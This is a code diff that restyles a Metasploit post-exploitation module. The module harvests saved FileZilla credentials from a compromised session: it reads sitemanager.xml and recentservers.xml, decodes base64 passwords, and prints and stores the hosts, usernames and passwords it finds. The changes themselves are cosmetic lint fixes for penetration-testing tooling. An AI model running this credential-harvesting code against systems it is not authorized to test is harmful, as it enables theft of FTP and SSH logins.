@@ -20,7 +20,7 @@ class MetasploitModule < Msf::Post
           'bannedit', # post port, added support for shell sessions
           'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
         ],
-        'Platform' => %w{bsd linux osx unix win},
+        'Platform' => %w[bsd linux osx unix win],
         'SessionTypes' => ['shell', 'meterpreter' ],
         'Compat' => {
           'Meterpreter' => {
@@ -50,9 +50,9 @@ class MetasploitModule < Msf::Post
       paths = enum_users_unix
     when 'windows'
       @platform = :windows
-      profiles = grab_user_profiles()
+      profiles = grab_user_profiles
       profiles.each do |user|
-        next if user['AppData'] == nil
+        next if user['AppData'].nil?
 
         fzdir = check_filezilla(user['AppData'])
         paths << fzdir if fzdir
@@ -62,8 +62,8 @@ class MetasploitModule < Msf::Post
       print_error "Unsupported platform #{session.platform}"
       return
     end
-    if paths.nil? or paths.empty?
-      print_status("No users found with a FileZilla directory")
+    if paths.nil? || paths.empty?
+      print_status('No users found with a FileZilla directory')
       return
     end
 
@@ -72,9 +72,9 @@ class MetasploitModule < Msf::Post
 
   def enum_users_unix
     if @platform == :osx
-      home = "/Users/"
+      home = '/Users/'
     else
-      home = "/home/"
+      home = '/home/'
     end
 
     if got_root?
@@ -93,7 +93,7 @@ class MetasploitModule < Msf::Post
     paths = Array.new
     userdirs.each_line do |dir|
       dir.chomp!
-      next if dir == "." || dir == ".."
+      next if dir == '.' || dir == '..'
 
       dir = "#{home}#{dir}" if dir !~ /root/
       print_status("Checking for FileZilla Client profile in: #{dir}")
@@ -128,7 +128,7 @@ class MetasploitModule < Msf::Post
 
     credential_data = {
       module_fullname: fullname,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
@@ -138,20 +138,20 @@ class MetasploitModule < Msf::Post
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
   end
 
   def get_filezilla_creds(paths)
-    sitedata = ""
-    recentdata = ""
+    sitedata = ''
+    recentdata = ''
     creds = []
 
     paths.each do |path|
       print_status("Reading sitemanager.xml and recentservers.xml files from #{path}")
-      if session.type == "shell"
+      if session.type == 'shell'
         type = :shell
         sites = session.shell_command("cat #{path}/sitemanager.xml")
         recents = session.shell_command("cat #{path}/recentservers.xml")
@@ -161,31 +161,35 @@ class MetasploitModule < Msf::Post
       else
         type = :meterp
         sitexml = "#{path}\\sitemanager.xml"
-        present = session.fs.file.stat(sitexml) rescue nil
+        present = begin
+          session.fs.file.stat(sitexml)
+        rescue StandardError
+          nil
+        end
         if present
-          sites = session.fs.file.new(sitexml, "rb")
-          until sites.eof?
-            sitedata << sites.read
-          end
+          sites = session.fs.file.new(sitexml, 'rb')
+          sitedata << sites.read until sites.eof?
           sites.close
-          print_status("Parsing sitemanager.xml")
+          print_status('Parsing sitemanager.xml')
           creds = [parse_accounts(sitedata)]
         else
-          print_status("No saved connections where found")
+          print_status('No saved connections where found')
         end
 
         recent_file = "#{path}\\recentservers.xml"
-        recent_present = session.fs.file.stat(recent_file) rescue nil
+        recent_present = begin
+          session.fs.file.stat(recent_file)
+        rescue StandardError
+          nil
+        end
         if recent_present
-          recents = session.fs.file.new(recent_file, "rb")
-          until recents.eof?
-            recentdata << recents.read
-          end
+          recents = session.fs.file.new(recent_file, 'rb')
+          recentdata << recents.read until recents.eof?
           recents.close
-          print_status("Parsing recentservers.xml")
+          print_status('Parsing recentservers.xml')
           creds << parse_accounts(recentdata)
         else
-          print_status("No recent connections where found.")
+          print_status('No recent connections where found.')
         end
       end
       creds.each do |cred|
@@ -211,54 +215,82 @@ class MetasploitModule < Msf::Post
   def parse_accounts(data)
     creds = []
 
-    doc = REXML::Document.new(data).root rescue nil
+    doc = begin
+      REXML::Document.new(data).root
+    rescue StandardError
+      nil
+    end
     return [] if doc.nil?
 
-    doc.elements.to_a("//Server").each do |sub|
+    doc.elements.to_a('//Server').each do |sub|
       account = {}
-      account['host'] = sub.elements['Host'].text rescue "<unknown>"
-      account['port'] = sub.elements['Port'].text rescue "<unknown>"
+      account['host'] = begin
+        sub.elements['Host'].text
+      rescue StandardError
+        '<unknown>'
+      end
+      account['port'] = begin
+        sub.elements['Port'].text
+      rescue StandardError
+        '<unknown>'
+      end
 
       case sub.elements['Logontype'].text
-      when "0"
-        account['logontype'] = "Anonymous"
+      when '0'
+        account['logontype'] = 'Anonymous'
       when /1|4/
-        account['user'] = sub.elements['User'].text rescue "<unknown>"
+        account['user'] = begin
+          sub.elements['User'].text
+        rescue StandardError
+          '<unknown>'
+        end
         if sub.elements['Pass'].attributes['encoding'] == 'base64'
-          account['password'] = Rex::Text.decode_base64(sub.elements['Pass'].text) rescue "<unknown>"
+          account['password'] = begin
+            Rex::Text.decode_base64(sub.elements['Pass'].text)
+          rescue StandardError
+            '<unknown>'
+          end
         else
-          account['password'] = sub.elements['Pass'].text rescue "<unknown>"
+          account['password'] = begin
+            sub.elements['Pass'].text
+          rescue StandardError
+            '<unknown>'
+          end
         end
       when /2|3/
-        account['user'] = sub.elements['User'].text rescue "<unknown>"
-        account['password'] = "<blank>"
+        account['user'] = begin
+          sub.elements['User'].text
+        rescue StandardError
+          '<unknown>'
+        end
+        account['password'] = '<blank>'
       end
 
       if account['user'].nil?
-        account['user'] = "<blank>"
+        account['user'] = '<blank>'
       end
       if account['password'].nil?
-        account['password'] = "<blank>"
+        account['password'] = '<blank>'
       end
 
       case sub.elements['Protocol'].text
-      when "0"
-        account['protocol'] = "FTP"
-      when "1"
-        account['protocol'] = "SSH"
-      when "3"
-        account['protocol'] = "FTPS"
-      when "4"
-        account['protocol'] = "FTPES"
+      when '0'
+        account['protocol'] = 'FTP'
+      when '1'
+        account['protocol'] = 'SSH'
+      when '3'
+        account['protocol'] = 'FTPS'
+      when '4'
+        account['protocol'] = 'FTPES'
       end
       creds << account
 
-      print_status("    Collected the following credentials:")
-      print_status("    Server: %s:%s" % [account['host'], account['port']])
-      print_status("    Protocol: %s" % account['protocol'])
-      print_status("    Username: %s" % account['user'])
-      print_status("    Password: %s" % account['password'])
-      print_line("")
+      print_status('    Collected the following credentials:')
+      print_status('    Server: %s:%s' % [account['host'], account['port']])
+      print_status('    Protocol: %s' % account['protocol'])
+      print_status('    Username: %s' % account['user'])
+      print_status('    Password: %s' % account['password'])
+      print_line('')
     end
     return creds
   end
@@ -285,7 +317,7 @@ class MetasploitModule < Msf::Post
     if @platform == :windows
       session.sys.config.getenv('USERNAME')
     else
-      session.shell_command("whoami").chomp
+      session.shell_command('whoami').chomp
     end
   end
 end
